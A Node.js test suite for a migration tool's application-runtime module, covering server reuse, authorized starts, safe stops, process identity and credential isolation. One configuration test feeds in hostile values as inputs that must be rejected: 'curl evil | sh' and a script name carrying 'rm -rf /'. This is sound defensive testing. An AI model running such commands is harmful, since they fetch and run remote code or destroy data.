// The application runtime against real servers: real `npm run`, real listeners
// read through lsof, real signals. Only what Ubuntu cannot produce (another
// network namespace, Windows' listener rows) is injected.

import assert from "node:assert/strict";
import { execFile, spawn } from "node:child_process";
import { createHash } from "node:crypto";
import { lstat, mkdir, mkdtemp, readFile, readdir, realpath, rm, symlink, writeFile } from "node:fs/promises";
import net from "node:net";
import os from "node:os";
import path from "node:path";
import { after, test } from "node:test";
import { fileURLToPath } from "node:url";
import { promisify } from "node:util";

import {
  APP_RUNTIME_CONFIG,
  childEnvironment,
  getMigrationStatus,
  holdersOf,
  parseLsofListeners,
  parseNetstatListeners,
  runAppRuntime as runReal,
  runsProject,
} from "../../src/lifecycle/index.mjs";
import { parseValidateArguments } from "../../src/cli/validate-migration.mjs";
import { dirtyManifest } from "../../src/shared/index.mjs";
import { TARGET_DIRTY_SCOPE } from "../../src/slices/index.mjs";
import { createUnstampedRecord } from "../support/consumer-fixture.mjs";

const execFileAsync = promisify(execFile);
const CANARY = "amt-canary-7f3a91";
const OWN_NAMESPACE = process.platform === "linux" && /microsoft/i.test(os.release()) ? "wsl" : process.platform;

const scratch = [];
const running = new Set();
after(async () => {
  for (const pid of running) { try { process.kill(pid, "SIGKILL"); } catch { /* gone */ } }
  await Promise.all(scratch.map((directory) => rm(directory, { recursive: true, force: true })));
});

const freePort = () => new Promise((resolve) => {
  const server = net.createServer();
  server.listen(0, "127.0.0.1", () => {
    const { port } = server.address();
    server.close(() => resolve(port));
  });
});

const refused = (port) => new Promise((resolve) => {
  const socket = net.connect(port, "127.0.0.1");
  socket.once("connect", () => { socket.destroy(); resolve(false); });
  socket.once("error", () => resolve(true));
});

const until = async (condition, label) => {
  const deadline = Date.now() + 10_000;
  while (!(await condition())) {
    assert.ok(Date.now() < deadline, `timed out waiting for ${label}`);
    await new Promise((resolve) => setTimeout(resolve, 25));
  }
};

/** A small HTTP application; every start appends a line to starts.log. */
const SERVER = (port, routes, marker) => `
import { appendFileSync, writeFileSync } from "node:fs";
import http from "node:http";
appendFileSync("starts.log", process.pid + "\\n");
writeFileSync("env.json", JSON.stringify(process.env));
const routes = ${JSON.stringify(routes)};
http.createServer((request, response) => {
  if (request.url === "/public") { response.writeHead(200, { "set-cookie": "sid=${CANARY}" }); response.end("<title>${marker}</title> ${CANARY}"); return; }
  const route = routes[request.url];
  if (!route) { response.writeHead(404); response.end(); return; }
  response.writeHead(route.status, route.headers ?? {});
  response.end(route.body ?? "");
}).listen(${port}, "127.0.0.1");
`;

const SIGN_IN_REDIRECT = { "/private": { status: 307, headers: { location: `/login?token=${CANARY}` } } };

const writeProject = async (directory, port, { routes = SIGN_IN_REDIRECT, marker = "fixture-app", script = "node server.mjs" } = {}) => {
  await mkdir(directory, { recursive: true });
  await writeFile(path.join(directory, "server.mjs"), SERVER(port, routes, marker));
  await writeFile(path.join(directory, "package.json"), JSON.stringify({ name: "fixture", private: true, scripts: { dev: script } }));
  return directory;
};

const launch = async (directory, port) => {
  const child = spawn(process.execPath, ["server.mjs", `--session=${CANARY}`], { cwd: directory, stdio: "ignore", detached: true, env: { PATH: process.env.PATH } });
  child.unref();
  running.add(child.pid);
  await until(async () => !(await refused(port)), "the fixture server");
  return child;
};

/** A target root with a registry; `config` is what the operator would write. */
const workspace = async ({ applications, namespace = OWN_NAMESPACE, moduleName = "orders" }) => {
  const root = await realpath(await mkdtemp(path.join(os.tmpdir(), "amt-app-runtime-")));
  scratch.push(root);
  const targetRoot = path.join(root, "target");
  const registryPath = path.join(targetRoot, ".agents/knowledge/migrations/registry.json");
  await mkdir(path.dirname(registryPath), { recursive: true });
  await writeFile(registryPath, JSON.stringify({
    version: 1,
    projects: { legacy: { root: "../../../../legacy" }, target: { root: "../../.." } },
    modules: { [moduleName]: { target: moduleName } },
  }));
  await mkdir(path.join(root, "legacy"), { recursive: true });
  const write = async (document) => {
    await mkdir(path.join(targetRoot, ".artifact-migration-tools"), { recursive: true });
    await writeFile(path.join(targetRoot, APP_RUNTIME_CONFIG), JSON.stringify(document));
  };
  if (applications) await write({ version: 1, namespace, applications: await applications(root) });
  const runAppRuntime = (action, options = {}) => runReal({ registryPath, moduleName, action, ...options });
  return { root, targetRoot, registryPath, write, runAppRuntime };
};

const application = (project, port, extra = {}) => ({
  origin: `http://127.0.0.1:${port}`,
  project,
  identity: { route: "/public", includes: "fixture-app" },
  ...extra,
});

/** LEGACY and TARGET are both required; TARGET is a second instance of the same shape. */
const twoApps = async (first, extra = {}, { routes } = {}) => {
  const port = await freePort();
  const sibling = await freePort();
  const space = await workspace({
    applications: async (root) => {
      await writeProject(path.join(root, "legacy-app"), port, { routes, ...first });
      await writeProject(path.join(root, "target-app"), sibling);
      return {
        LEGACY: application("../legacy-app", port, { protectedRoute: "/private", ...extra }),
        TARGET: application("../target-app", sibling),
      };
    },
  });
  const legacy = path.join(space.root, "legacy-app");
  const target = path.join(space.root, "target-app");
  return { ...space, port, sibling, legacy, target };
};

const row = (report, role) => report.applications.find((item) => item.role === role);

const starts = async (project) =>
  (await readFile(path.join(project, "starts.log"), "utf8").catch(() => "")).split("\n").filter(Boolean).length;

const NPM_START = { manager: "npm", script: "dev" };

test("an application already running in its project is reused, never started again", async () => {
  const space = await twoApps({});
  await launch(space.legacy, space.port);
  await launch(space.target, space.sibling);
  const report = await space.runAppRuntime("ensure");
  assert.equal(row(report, "LEGACY").state, "AUTH_REQUIRED");
  assert.equal(row(report, "TARGET").state, "READY");
  assert.equal(row(report, "LEGACY").reused, true);
  assert.equal(row(report, "LEGACY").started, false);
  assert.equal(await starts(space.legacy), 1);
  await assert.rejects(lstat(path.join(space.targetRoot, ".artifact-migration-tools/app-runtime/LEGACY.json")), { code: "ENOENT" });
});

test("a stopped application starts through its authorized script, once, and stop ends it", async () => {
  const space = await twoApps({}, { start: NPM_START });
  await launch(space.target, space.sibling);
  const first = await space.runAppRuntime("ensure");
  assert.equal(row(first, "LEGACY").state, "AUTH_REQUIRED");
  assert.equal(row(first, "LEGACY").started, true);
  assert.match(row(first, "LEGACY").log, /^\.artifact-migration-tools\/app-runtime\/LEGACY\.log$/);

  const second = await space.runAppRuntime("ensure");
  assert.equal(row(second, "LEGACY").reused, true);
  assert.equal(row(second, "LEGACY").started, false);
  assert.equal(await starts(space.legacy), 1);

  const stopped = await space.runAppRuntime("stop");
  assert.equal(stopped.applications.find((item) => item.role === "LEGACY").stopped, true);
  await until(() => refused(space.port), "the owned server to stop");
  assert.equal(stopped.applications.find((item) => item.role === "TARGET").stopped, false);
  assert.equal(await refused(space.sibling), false, "stop must leave a process it did not start");
});

test("a started application whose protected route is not built yet stays running", async () => {
  const space = await twoApps({}, { start: NPM_START, startTimeoutMs: 1_500 }, { routes: { "/private": { status: 404 } } });
  await launch(space.target, space.sibling);
  const report = await space.runAppRuntime("ensure");
  assert.equal(row(report, "LEGACY").state, "READY");
  assert.equal(row(report, "LEGACY").started, true);
  assert.equal(row(report, "LEGACY").failure, undefined);
  assert.equal(await refused(space.port), false);
  await space.runAppRuntime("stop");
});

test("a stopped application without authorization stays stopped", async () => {
  const space = await twoApps({});
  await launch(space.target, space.sibling);
  const report = await space.runAppRuntime("ensure");
  assert.equal(report.state, "RUNTIME_DOWN");
  assert.equal(row(report, "LEGACY").startAuthorized, false);
  assert.match(row(report, "LEGACY").reason, /authorizes no start/);
  assert.equal(await starts(space.legacy), 0);
});

test("the wrong application on the port is refused by marker and by process, and nothing starts", async () => {
  const space = await twoApps({}, { start: NPM_START });
  await launch(space.target, space.sibling);
  const other = path.join(space.root, "other");
  await writeProject(other, space.port, { marker: "another-app" });
  await launch(other, space.port);
  const byMarker = await space.runAppRuntime("ensure");
  assert.equal(row(byMarker, "LEGACY").state, "WRONG_APP");
  assert.match(row(byMarker, "LEGACY").reason, /identity marker/);
  assert.equal(await starts(space.legacy), 0);

  // The dangerous one: an identical copy, the same HTTP answers, another deployment.
  const copyPort = await freePort();
  const copy = path.join(space.root, "production-copy");
  await writeProject(copy, copyPort);
  await launch(copy, copyPort);
  await space.write({ version: 1, namespace: OWN_NAMESPACE, applications: {
    LEGACY: application("../legacy-app", copyPort),
    TARGET: application("../target-app", space.sibling),
  } });
  const byProcess = await space.runAppRuntime("check");
  assert.equal(row(byProcess, "LEGACY").state, "WRONG_APP");
  assert.match(row(byProcess, "LEGACY").reason, /outside/);
});

test("sign-in answers are AUTH_REQUIRED, a served route is READY, an unavailable server is RUNTIME_DOWN", async () => {
  const cases = [
    [{ "/private": { status: 200, body: "dashboard" } }, "READY"],
    [{ "/private": { status: 401 } }, "AUTH_REQUIRED"],
    [{ "/private": { status: 403 } }, "AUTH_REQUIRED"],
    [{ "/private": { status: 302, headers: { location: "/sign-in?next=/private" } } }, "AUTH_REQUIRED"],
    [{ "/private": { status: 302, headers: { location: "https://idp.example.test/oauth" } } }, "AUTH_REQUIRED"],
    [{ "/private": { status: 200, body: '<form><input name="p" type="password"></form>' } }, "AUTH_REQUIRED"],
    [{ "/private": { status: 503 } }, "RUNTIME_DOWN"],
    [{ "/private": { status: 404 } }, "READY"], // up, route not built yet
    [{ "/private": { status: 302, headers: { location: "http://[malformed" } } }, "READY"],
  ];
  for (const [routes, expected] of cases) {
    const space = await twoApps({}, { start: NPM_START }, { routes });
    await launch(space.legacy, space.port);
    await launch(space.target, space.sibling);
    const report = await space.runAppRuntime("ensure");
    assert.equal(row(report, "LEGACY").state, expected, JSON.stringify(routes));
    assert.equal(await starts(space.legacy), 1, "an answering server is never started again");
  }
  const down = await twoApps({});
  const report = await down.runAppRuntime("check");
  assert.equal(row(report, "LEGACY").state, "RUNTIME_DOWN");
  assert.match(row(report, "LEGACY").reason, /nothing listens/);
});

test("a wrong network namespace probes and starts nothing", async () => {
  const space = await twoApps({}, { start: NPM_START });
  await space.write({ version: 1, namespace: "win32-elsewhere", applications: {
    LEGACY: application("../legacy-app", space.port, { start: NPM_START }),
    TARGET: application("../target-app", space.sibling),
  } });
  const report = await space.runAppRuntime("ensure");
  assert.equal(report.state, "WRONG_NAMESPACE");
  assert.match(report.reason, /different machine/);
  assert.equal(await starts(space.legacy), 0);
});

test("an answer with no local process behind it, or a shadow on the other address, proves nothing", async () => {
  const space = await twoApps({});
  await launch(space.legacy, space.port);
  await launch(space.target, space.sibling);
  const injected = (listeners) => ({ namespace: OWN_NAMESPACE, listeners: async () => listeners, processStart: async () => null, killTree: async () => {} });

  // A forwarded port (wslrelay, docker-proxy of another user): HTTP answers, no listener here.
  const forwarded = await space.runAppRuntime("check", { system: injected([]) });
  assert.equal(row(forwarded, "LEGACY").state, "IDENTITY_UNPROVEN");
  const uninspectable = await space.runAppRuntime("check", { system: injected(null) });
  assert.equal(row(uninspectable, "LEGACY").state, "IDENTITY_UNPROVEN");
  const shadow = await space.runAppRuntime("check", {
    system: injected([{ address: "0.0.0.0", pid: 1, command: "node /srv/process-manager/fork.js", cwd: "/" }]),
  });
  assert.equal(row(shadow, "LEGACY").state, "WRONG_APP");
});

test("listener parsing and ownership hold the rows real hosts produced", () => {
  // Windows, as observed: a production copy shares IPv4 with the dual-stack
  // development server, on a host whose netstat speaks another language.
  const netstat = [
    "  Proto  Dirección local   Dirección remota  Estado  PID",
    "  TCP    0.0.0.0:3000           0.0.0.0:0              LISTENING       22",
    "  TCP    0.0.0.0:3000           0.0.0.0:0              LISTENING       11",
    "  TCP    0.0.0.0:30001          0.0.0.0:0              LISTENING       33",
    "  TCP    [::]:3000              [::]:0                 ESCUCHANDO      11",
    "  TCP    [::1]:3000             [::]:0                 ESCUCHANDO      44",
    "  TCP    127.0.0.1:3000         127.0.0.1:50000        ESTABLISHED     55",
    "  UDP    0.0.0.0:3000           *:*                                    66",
  ].join("\r\n");
  const rows = parseNetstatListeners(netstat, 3000);
  assert.deepEqual(rows, [{ address: "0.0.0.0", pid: 22 }, { address: "0.0.0.0", pid: 11 }, { address: "::", pid: 11 }, { address: "::1", pid: 44 }]);
  assert.deepEqual(holdersOf(rows, { address: "::1", family: 6 }).map((item) => item.pid), [11, 44]);
  assert.deepEqual(holdersOf(rows, { address: "127.0.0.1", family: 4 }).map((item) => item.pid), [22, 11]);
  const project = String.raw`C:\Users\dev\work\app`;
  assert.equal(runsProject({ command: String.raw`"C:\Program Files\nodejs\node.exe" C:\Users\dev\work\app\node_modules\next\dist\server\lib\start-server.js` }, project, "win32"), true);
  assert.equal(runsProject({ command: String.raw`node C:\Users\dev\AppData\Roaming\npm\node_modules\pm2\lib\ProcessContainerFork.js` }, project, "win32"), false);
  assert.equal(runsProject({ command: String.raw`node C:\Users\dev\work\app-v2\server.js` }, project, "win32"), false, "a sibling sharing the prefix is foreign");
  assert.equal(runsProject({ command: null }, project, "win32"), null);

  // A lone dual-stack `::` serves IPv4 as well.
  assert.deepEqual(holdersOf([{ address: "::", pid: 5 }], { address: "127.0.0.1", family: 4 }).map((item) => item.pid), [5]);
  // An address on another interface is not this loopback's holder.
  assert.deepEqual(holdersOf([{ address: "172.16.0.9", pid: 6 }], { address: "127.0.0.1", family: 4 }), []);

  assert.deepEqual(parseLsofListeners("p10\nf20\ntIPv6\nn*:3000\np11\nf21\ntIPv4\nn*:3000\np12\nf3\ntIPv6\nn[::1]:3000\nf4\ntIPv4\nn127.0.0.1:3000\n"), [
    { address: "::", pid: 10 }, { address: "0.0.0.0", pid: 11 }, { address: "::1", pid: 12 }, { address: "127.0.0.1", pid: 12 },
  ]);
  assert.equal(runsProject({ command: "node server.js", cwd: "/work/app/sub" }, "/work/app", "linux"), true);
  assert.equal(runsProject({ command: "node /work/app-v2/server.js", cwd: "/" }, "/work/app", "linux"), false);
  assert.equal(runsProject({ command: null, cwd: null }, "/work/app", "linux"), null);
});

test("a startup that never becomes ready is timed out and killed; a failing one is reported", async () => {
  const hanging = await twoApps({ script: 'node -e "setInterval(() => {}, 1000)"' }, { start: NPM_START, startTimeoutMs: 700 });
  await launch(hanging.target, hanging.sibling);
  const report = await hanging.runAppRuntime("ensure");
  assert.equal(row(report, "LEGACY").state, "RUNTIME_DOWN");
  assert.equal(row(report, "LEGACY").failure, "STARTUP_TIMEOUT");
  await assert.rejects(lstat(path.join(hanging.targetRoot, ".artifact-migration-tools/app-runtime/LEGACY.json")), { code: "ENOENT" });
  const { stdout } = await execFileAsync("ps", ["-eo", "command"]);
  assert.ok(!stdout.split("\n").some((line) => line.startsWith("node -e setInterval")), "the timed-out tree must be gone");

  const failing = await twoApps({ script: 'node -e "process.exit(3)"' }, { start: NPM_START });
  await launch(failing.target, failing.sibling);
  const failed = await failing.runAppRuntime("ensure");
  assert.equal(row(failed, "LEGACY").failure, "STARTUP_FAILED");
  assert.match(row(failed, "LEGACY").reason, /exited \(3\)/);
});

test("concurrent ensures start one process", async () => {
  const space = await twoApps({}, { start: NPM_START });
  await launch(space.target, space.sibling);
  const reports = await Promise.all([space.runAppRuntime("ensure"), space.runAppRuntime("ensure"), space.runAppRuntime("ensure")]);
  assert.deepEqual(reports.map((report) => row(report, "LEGACY").state), ["AUTH_REQUIRED", "AUTH_REQUIRED", "AUTH_REQUIRED"]);
  assert.equal(reports.filter((report) => row(report, "LEGACY").started).length, 1);
  assert.equal(await starts(space.legacy), 1);
  await space.runAppRuntime("stop");
});

test("an ownership record does not outlive its process: a recycled PID is never killed", async () => {
  const space = await twoApps({});
  const bystander = await launch(space.legacy, space.port);
  const file = path.join(space.targetRoot, ".artifact-migration-tools/app-runtime/LEGACY.json");
  await mkdir(path.dirname(file), { recursive: true });
  await writeFile(file, JSON.stringify({ version: 1, role: "LEGACY", pid: bystander.pid, namespace: OWN_NAMESPACE, processStart: "a time this PID never started", origin: "x" }));
  const stopped = await space.runAppRuntime("stop");
  assert.equal(stopped.applications.find((item) => item.role === "LEGACY").stopped, false);
  assert.equal(await refused(space.port), false);
  await assert.rejects(lstat(file), { code: "ENOENT" });
});

test("stop from another namespace leaves the ownership record of a live process alone", async () => {
  const space = await twoApps({}, { start: NPM_START });
  await launch(space.target, space.sibling);
  await space.runAppRuntime("ensure");
  const file = path.join(space.targetRoot, ".artifact-migration-tools/app-runtime/LEGACY.json");
  const elsewhere = { namespace: "another", listeners: async () => [], processStart: async () => null, killTree: async () => assert.fail("must not kill") };
  const report = await space.runAppRuntime("stop", { system: elsewhere });
  assert.equal(report.applications.find((item) => item.role === "LEGACY").stopped, false);
  assert.equal((await lstat(file)).isFile(), true);
  await space.runAppRuntime("stop");
  await until(() => refused(space.port), "the owned server to stop");
});

test("a module with no browser work needs no application and no configuration", async () => {
  const nonvisual = await workspace({});
  const inventories = path.join(nonvisual.targetRoot, ".agents/knowledge/migrations/modules/orders/inventories");
  await mkdir(inventories, { recursive: true });
  await writeFile(path.join(inventories, "legacy.json"), JSON.stringify({ hasVisibleUi: false }));
  const statePath = path.join(inventories, "../state.json");
  // The template seeds that value, so it proves nothing until discovery has closed.
  await writeFile(statePath, JSON.stringify({ status: "ACTIVE", completedSteps: ["RESOLVE"] }));
  assert.equal((await nonvisual.runAppRuntime("check")).state, "CONFIGURATION_MISSING");
  await writeFile(statePath, JSON.stringify({ status: "ACTIVE", completedSteps: ["RESOLVE", "DISCOVER_LEGACY"] }));
  for (const action of ["check", "ensure"]) {
    const report = await nonvisual.runAppRuntime(action);
    assert.equal(report.state, "NOT_REQUIRED");
    assert.deepEqual(report.applications, []);
  }

  const complete = await workspace({});
  const module = path.join(complete.targetRoot, ".agents/knowledge/migrations/modules/orders");
  await mkdir(module, { recursive: true });
  await writeFile(path.join(module, "state.json"), JSON.stringify({ status: "COMPLETE" }));
  assert.equal((await complete.runAppRuntime("ensure")).state, "NOT_REQUIRED");
});

const treeDigest = async (root) => {
  const hash = createHash("sha256");
  for (const entry of (await readdir(root, { recursive: true, withFileTypes: true })).filter((item) => item.isFile()).map((item) => path.join(item.parentPath, item.name)).sort()) {
    hash.update(entry).update(await readFile(entry));
  }
  return hash.digest("hex");
};

test("an ACTIVE record is untouched by every action, status is unchanged, and it resumes once the runtime is corrected", async () => {
  const consumer = await createUnstampedRecord({ prefix: "amt-app-runtime-record-" });
  scratch.push(consumer.root);
  const options = { registryPath: consumer.registryPath, moduleName: "auth" };
  const port = await freePort();
  const sibling = await freePort();
  const legacy = await writeProject(path.join(consumer.root, "legacy-app"), port);
  const target = await writeProject(path.join(consumer.root, "target-app"), sibling);
  await mkdir(path.join(consumer.targetRoot, ".artifact-migration-tools"), { recursive: true });
  const configFile = path.join(consumer.targetRoot, APP_RUNTIME_CONFIG);
  await writeFile(configFile, JSON.stringify({ version: 1, namespace: OWN_NAMESPACE, applications: {
    LEGACY: application("../legacy-app", port, { start: NPM_START }),
    TARGET: application("../target-app", sibling, { start: NPM_START }),
  } }));
  await execFileAsync("git", ["-C", consumer.root, "add", "-N", "legacy-app"]); // A dirty tree is no reason to refuse.

  // A consumer that does not ignore the directory must not see the file as slice drift.
  const dirty = await dirtyManifest(consumer.targetRoot, TARGET_DIRTY_SCOPE);
  assert.ok(!dirty.entries.some((entry) => entry.path === APP_RUNTIME_CONFIG), "the configuration is no slice's work");

  const record = await treeDigest(consumer.recordRoot);
  const whole = await treeDigest(consumer.targetRoot);
  const status = JSON.stringify(await getMigrationStatus(options));
  const down = await runReal({ ...options, action: "check" });
  assert.equal(down.state, "RUNTIME_DOWN");
  assert.equal(await treeDigest(consumer.targetRoot), whole, "check writes nothing at all");
  assert.equal(await starts(legacy), 0);

  const ready = await runReal({ ...options, action: "ensure" });
  assert.equal(ready.state, "READY");
  assert.equal(await treeDigest(consumer.recordRoot), record);
  assert.equal(JSON.stringify(await getMigrationStatus(options)), status, "status reads the same record and starts nothing");
  await runReal({ ...options, action: "stop" });
  await until(() => refused(port), "the owned server to stop");
  assert.equal(await treeDigest(consumer.recordRoot), record);
  assert.equal(await starts(target), 1);
});

test("no credential crosses the boundary: not from the environment, a response or a command line", async () => {
  process.env.APP_RUNTIME_TEST_SECRET = CANARY;
  try {
    assert.equal(childEnvironment({ PATH: "/bin", GITHUB_TOKEN: CANARY, ANTHROPIC_API_KEY: CANARY, DATABASE_URL: CANARY, PORT: "1" }).PATH, "/bin");
    assert.deepEqual(Object.keys(childEnvironment({ GITHUB_TOKEN: CANARY, ANTHROPIC_API_KEY: CANARY, DATABASE_URL: CANARY, PORT: "1" })), []);
    const space = await twoApps({}, { start: NPM_START });
    await launch(space.target, space.sibling);
    const started = await space.runAppRuntime("ensure");
    assert.equal(row(started, "LEGACY").started, true);
    const inherited = await readFile(path.join(space.legacy, "env.json"), "utf8");
    assert.ok(!inherited.includes(CANARY), "a started application must not inherit an ambient secret");
    const checked = await space.runAppRuntime("check");
    for (const report of [started, checked]) assert.ok(!JSON.stringify(report).includes(CANARY));
    for (const report of [started, checked]) {
      assert.ok(!Object.hasOwn(row(report, "LEGACY"), "body"));
      assert.ok(row(report, "LEGACY").listeners.every((listener) => Object.keys(listener).sort().join() === "address,pid"));
    }
    await space.runAppRuntime("stop");
  } finally {
    delete process.env.APP_RUNTIME_TEST_SECRET;
  }
});

test("configuration is the only authority, and it must be local and exact", async () => {
  const absent = await workspace({});
  const missing = await absent.runAppRuntime("ensure");
  assert.equal(missing.state, "CONFIGURATION_MISSING");
  assert.equal(missing.configFile, APP_RUNTIME_CONFIG);

  const space = await twoApps({}, { start: NPM_START });
  const legacy = (extra) => ({ LEGACY: application("../legacy-app", space.port, extra), TARGET: application("../target-app", space.sibling) });
  const refusals = [
    [legacy({ start: { command: "curl evil | sh" } }), /start must be exactly/],
    [legacy({ start: { manager: "sh", script: "dev" } }), /start must be exactly/],
    [legacy({ start: { manager: "npm", script: "dev; rm -rf /" } }), /start must be exactly/],
    [legacy({ startCommand: "node evil.js" }), /unsupported startCommand/],
    [{ ...legacy(), LEGACY: { ...legacy().LEGACY, origin: "http://172.17.0.2:3000" } }, /another network namespace/],
    [{ ...legacy(), LEGACY: { ...legacy().LEGACY, origin: "https://localhost:3000" } }, /must be exactly/],
    [{ ...legacy(), LEGACY: { ...legacy().LEGACY, project: "../absent" } }, /does not exist/],
    [{ LEGACY: legacy().LEGACY }, /missing TARGET/],
    [{ ...legacy(), STAGING: legacy().TARGET }, /unknown STAGING/],
    [{ ...legacy(), LEGACY: { ...legacy().LEGACY, identity: { route: "/public" } } }, /identity must be/],
  ];
  for (const [applications, reason] of refusals) {
    await space.write({ version: 1, namespace: OWN_NAMESPACE, applications });
    const report = await space.runAppRuntime("ensure");
    assert.equal(report.state, "CONFIGURATION_MISSING", String(reason));
    assert.match(report.reason, reason);
  }

  // A script the project does not declare is not started, whatever the file says.
  await space.write({ version: 1, namespace: OWN_NAMESPACE, applications: legacy({ start: { manager: "npm", script: "not-declared" } }) });
  assert.equal((await space.runAppRuntime("ensure")).state, "CONFIGURATION_MISSING");
  assert.equal(await starts(space.legacy), 0);

  // A file that arrived with the repository is not the operator's.
  await space.write({ version: 1, namespace: OWN_NAMESPACE, applications: legacy({ start: NPM_START }) });
  await execFileAsync("git", ["init", "-q"], { cwd: space.targetRoot });
  await execFileAsync("git", ["add", "-f", APP_RUNTIME_CONFIG], { cwd: space.targetRoot });
  const tracked = await space.runAppRuntime("ensure");
  assert.equal(tracked.state, "CONFIGURATION_MISSING");
  assert.match(tracked.reason, /tracked by Git/);
  await rm(path.join(space.targetRoot, ".git"), { recursive: true, force: true });

  // Neither is a link to somewhere else.
  const elsewhere = path.join(space.root, "elsewhere.json");
  await writeFile(elsewhere, "{}");
  await rm(path.join(space.targetRoot, APP_RUNTIME_CONFIG));
  await symlink(elsewhere, path.join(space.targetRoot, APP_RUNTIME_CONFIG));
  assert.match((await space.runAppRuntime("ensure")).reason, /symlink/);
});

test("the engine names no consumer, and the CLI exposes exactly the three actions", async () => {
  const source = await readFile(fileURLToPath(new URL("../../src/lifecycle/app-runtime.mjs", import.meta.url)), "utf8");
  assert.doesNotMatch(source, /\bwms\b|partners|\b\d{4,5}\b/i);
  assert.equal(parseValidateArguments(["auth", "--app-runtime", "ensure"]).appRuntime, "ensure");
  assert.throws(() => parseValidateArguments(["--app-runtime", "ensure"]), /Usage/);
  assert.throws(() => parseValidateArguments(["auth", "--app-runtime", "ensure", "--prefill"]), /Usage/);
  const space = await workspace({});
  await assert.rejects(space.runAppRuntime("restart"), /Unknown application runtime action/);
  assert.equal((await space.runAppRuntime("check")).namespace, OWN_NAMESPACE);
});
